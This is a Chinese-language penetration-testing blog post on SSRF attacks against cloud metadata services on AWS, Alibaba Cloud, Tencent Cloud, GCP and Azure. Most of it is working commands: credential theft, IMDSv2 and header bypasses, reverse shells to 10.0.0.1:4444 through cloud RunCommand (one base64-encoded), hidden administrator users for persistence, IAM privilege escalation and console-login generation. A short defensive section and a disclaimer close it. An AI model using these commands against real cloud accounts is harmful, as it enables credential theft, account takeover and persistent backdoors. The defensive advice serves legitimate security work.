---
title: "SSRF：云元数据攻击实战"
date: 2025-11-01 08:00:00
tags:
  - Web安全
  - 云安全
  - 渗透测试
categories: 渗透测试
---

## 前言

Server-Side Request Forgery（SSRF）在云环境中杀伤力被放大到极致——攻击者可直通元数据服务，窃取临时凭证、接管云资源、横向移动至整个基础设施。本文覆盖 AWS、阿里云、腾讯云、GCP、Azure 五大平台元数据攻击面，以及 STS 凭证窃取、IAM 提权、控制台生成等高级利用技术。

---

## 一、AWS EC2 元数据服务

### 1.1 IMDSv1

IMDSv1 无认证，仅依赖链路本地地址不可路由的特性。SSRF 打穿后元数据完全暴露。

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/ami-id
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/placement/region
curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key

# IAM 角色 → 临时凭证 (AccessKeyId + SecretAccessKey + Token)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**SSRF 文件包含（PHP）：**

```php
<?php echo file_get_contents($_GET['url']); ?>
// /ssrf.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

**gopher 协议绕过：**

```bash
curl "http://target/ssrf?url=gopher://169.254.169.254:80/_GET%20/latest/meta-data/...%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a"
```

### 1.2 IMDSv2 对抗

IMDSv2 要求先 PUT 获取 Token，多数 SSRF 仅支持 GET/POST，三种绕过思路如下。

```bash
# 正常流程
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/...
```

**绕过 1 — DNS Rebinding：** 首次解析到攻击者 IP（通过 Host 校验），TTL 到期后切回 169.254.169.254。

**绕过 2 — CRLF 注入**（取决于底层库实现）：

```bash
http://169.254.169.254/latest/api/token%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0aGET%20/...
```

**绕过 3 — 支持 PUT 的 SSRF 底层库：**

```python
import requests
token = requests.put("http://169.254.169.254/latest/api/token",
    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}).text
creds = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role",
    headers={"X-aws-ec2-metadata-token": token}).json()
```

---

## 二、阿里云 ECS 元数据服务

元数据地址 `100.100.100.200`（链路本地）。

```bash
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/instance-id
curl http://100.100.100.200/latest/meta-data/hostname
curl http://100.100.100.200/latest/meta-data/private-ipv4
curl http://100.100.100.200/latest/meta-data/region-id
curl http://100.100.100.200/latest/meta-data/zone-id
curl http://100.100.100.200/latest/meta-data/vpc-id

# RAM 角色临时凭证
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>
# 返回: AccessKeyId, AccessKeySecret, SecurityToken, Expiration

curl http://100.100.100.200/latest/user-data/
curl http://100.100.100.200/latest/meta-data/public-keys/0/openssh-key
```

**利用 + 云助手反弹 Shell：**

```bash
aliyun configure set --profile stolen --access-key-id STS.xxxxx --access-key-secret xxxxx --sts-token xxxxx --region cn-hangzhou
aliyun ecs DescribeInstances --profile stolen
aliyun ecs RunCommand --InstanceId i-xxx --Type RunShellScript --CommandContent "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" --profile stolen
```

---

## 三、腾讯云 CVM 元数据服务

端点：`169.254.0.23` / `metadata.tencentyun.com`。

```bash
curl http://metadata.tencentyun.com/latest/meta-data/
curl http://metadata.tencentyun.com/latest/meta-data/instance-id
curl http://metadata.tencentyun.com/latest/meta-data/local-ipv4
curl http://metadata.tencentyun.com/latest/meta-data/placement/region
curl http://metadata.tencentyun.com/latest/meta-data/app-id

# CAM 角色凭证
curl http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
curl http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role-name>
# 返回: TmpSecretId, TmpSecretKey, Token, ExpiredTime
```

**利用：**

```bash
export TENCENTCLOUD_SECRET_ID=<TmpSecretId> TENCENTCLOUD_SECRET_KEY=<TmpSecretKey> TENCENTCLOUD_SECURITY_TOKEN=<Token>
tccli cvm DescribeInstances
```

---

## 四、GCP Compute Engine 元数据服务

地址 `metadata.google.internal`，强制 `Metadata-Flavor: Google` 头。

```bash
H="Metadata-Flavor: Google"; B="http://metadata.google.internal/computeMetadata/v1"

curl -H "$H" $B/instance/id
curl -H "$H" $B/instance/name
curl -H "$H" $B/instance/zone
curl -H "$H" $B/instance/machine-type
curl -H "$H" $B/instance/network-interfaces/0/ip
curl -H "$H" $B/instance/network-interfaces/0/access-configs/0/external-ip

# 服务帐号 → OAuth2 Access Token
curl -H "$H" $B/instance/service-accounts/
curl -H "$H" $B/instance/service-accounts/<sa>/?recursive=true
curl -H "$H" $B/instance/service-accounts/default/token
# 返回: { "access_token": "ya29.c.xxx...", "expires_in": 3599 }

# Identity Token（访问 Cloud Functions）
curl -H "$H" "$B/instance/service-accounts/default/identity?audience=https://example.com"

# SSH 密钥 / 启动脚本
curl -H "$H" $B/instance/attributes/ssh-keys
curl -H "$H" $B/instance/attributes/startup-script
curl -H "$H" $B/project/attributes/
```

**绕过 `Metadata-Flavor` 头 — CRLF 注入：**

```bash
curl "http://target/ssrf?url=http://metadata.google.internal/...token%0d%0aMetadata-Flavor:%20Google"
```

---

## 五、Azure 实例元数据服务

地址 `169.254.169.254`，强制 `Metadata: true` 头及 `api-version` 参数。

```bash
H="Metadata: true"; API="api-version=2021-02-01"; B="http://169.254.169.254/metadata/instance"

curl -s -H "$H" "$B/compute?$API"
curl -s -H "$H" "$B/compute/name?$API&format=text"
curl -s -H "$H" "$B/compute/resourceGroupName?$API&format=text"
curl -s -H "$H" "$B/compute/subscriptionId?$API&format=text"
curl -s -H "$H" "$B/compute/location?$API&format=text"
curl -s -H "$H" "$B/compute/publicKeys?$API"
curl -s -H "$H" "$B/compute/userData?$API&format=text"

# Managed Identity Token
curl -s -H "$H" "http://169.254.169.254/metadata/identity/oauth2/token?$API&resource=https://management.azure.com/"
# 返回: { "access_token": "eyJ0eXAi...", "expires_in": "86399" }

# 利用 Token 枚举订阅 + 远程执行命令 (RunCommand)
AT="<access_token>"
curl -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions?api-version=2021-04-01"
curl -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Compute/virtualMachines/<vm>/runCommand?api-version=2021-07-01" \
  -d '{"commandId":"RunShellScript","script":["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}'
```

---

## 六、STS 凭证持久化

临时凭证 1-6 小时过期，必须快速创建永久后门。

**AWS：**

```bash
aws sts get-caller-identity --profile stolen
aws iam create-user --user-name system-monitor --profile stolen
aws iam create-access-key --user-name system-monitor --profile stolen
aws iam attach-user-policy --user-name system-monitor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile stolen
```

**阿里云：**

```bash
aliyun ram CreateUser --UserName system-monitor --DisplayName "Monitor" --profile stolen
aliyun ram CreateAccessKey --UserName system-monitor --profile stolen
aliyun ram AttachPolicyToUser --UserName system-monitor --PolicyType System --PolicyName AdministratorAccess --profile stolen
```

**腾讯云：**

```bash
tccli cam AddUser --Name system-monitor --Remark "Monitor"
tccli cam CreateAccessKey --TargetUin <uin>
tccli cam AttachUserPolicy --AttachPolicyId <admin-policy-id> --AttachUin <uin>
```

**GCP（创建 Service Account 密钥持久化）：**

```bash
curl -X POST -H "Authorization: Bearer <token>" \
  "https://iam.googleapis.com/v1/projects/<project>/serviceAccounts/<sa>/keys"
```

---

## 七、IAM 角色提权

**PassRole 传递高权限角色：**

```bash
aws lambda create-function --function-name backdoor --runtime python3.9 \
  --role arn:aws:iam::<acc>:role/admin-role --handler index.handler --zip-file fileb://func.zip --profile stolen
```

**CreatePolicy + AttachRolePolicy 自提权：**

```bash
aws iam create-policy --policy-name stealth --profile stolen \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
aws iam attach-role-policy --role-name <current-role> --policy-arn <arn> --profile stolen
```

**UpdateAssumeRolePolicy 信任外部：**

```bash
aws iam update-assume-role-policy --role-name target-role --profile stolen \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}'
# 扮演: aws sts assume-role --role-arn arn:aws:iam::<target>:role/target-role --role-session-name evil
```

---

## 八、控制台访问生成

**AWS 联合登录：**

```bash
aws sts get-federation-token --name console --duration-seconds 43200 --profile stolen
# https://signin.aws.amazon.com/federation?Action=login&Issuer=example&Destination=https://console.aws.amazon.com/&SigninToken=<token>
```

**阿里云控制台：**

```bash
aliyun ram CreateLoginProfile --UserName system-monitor --Password 'ComplexP@ssw0rd!' --PasswordResetRequired false --profile stolen
# https://signin.aliyun.com/<account-id>.onaliyun.com/login.htm
```

**GCP：**

```bash
gcloud auth activate-service-account --access-token-file=<(echo "<token>")
```

---

## 九、防御建议

### 应用层

1. **URL 白名单** — 禁止内网、链路本地地址
2. **禁用危险协议** — file://、gopher://、dict://、ftp://
3. **DNS 二次校验** — 解析后复检 IP，防御 DNS Rebinding
4. **禁止回显** — 不将远端响应直接返回用户

```python
import socket, ipaddress
from urllib.parse import urlparse

BLOCKED = [ipaddress.ip_network(n) for n in [
    "169.254.0.0/16", "100.100.100.200/32", "10.0.0.0/8",
    "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"
]]

def safe_url(url: str) -> bool:
    p = urlparse(url)
    if p.scheme not in ("http", "https"): return False
    ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))
    return not any(ip in net for net in BLOCKED)
```

### 云平台层

| 平台 | 关键防御措施 |
|------|-------------|
| **AWS** | 强制 IMDSv2 (`HttpTokens: required`)；SCP 禁止 `iam:PassRole`；CloudTrail 监控敏感 API |
| **阿里云** | 安全组限制 100.100.100.200 出站；RAM 最小权限；禁用非必要实例 RAM 角色 |
| **腾讯云** | 安全组限制 metadata.tencentyun.com / 169.254.0.23 出站；CAM 最小权限 |
| **GCP** | VPC Service Controls；禁用默认服务帐号广泛权限；Access Transparency |
| **Azure** | Managed Identity 替代密钥；Azure Policy 限制特权角色；Private Link |

### 监控要点

- 元数据端点高频访问（异常速率）
- 同一凭证短时间跨多服务调用
- 非预期地域 API 请求
- `CreateUser` / `CreateAccessKey` / `AttachRolePolicy` / `UpdateAssumeRolePolicy`

---

## 十、免责声明

**本文仅供安全研究与授权测试使用。** 文中技术仅适用于已获系统所有者书面授权的渗透测试、自有云环境安全评估及安全教育培训。任何未经授权的渗透测试、凭证窃取、资源接管均属违法行为。作者不对读者滥用本文技术造成的任何损失承担责任。使用前请确保遵守所在国家/地区法律法规及目标平台的可接受使用政策。

---

## 参考资料

- [AWS EC2 Instance Metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [阿里云 ECS 实例元数据](https://help.aliyun.com/document_detail/49122.html)
- [腾讯云 实例元数据](https://cloud.tencent.com/document/product/213/4934)
- [GCP Instance Metadata](https://cloud.google.com/compute/docs/metadata)
- [Azure IMDS](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
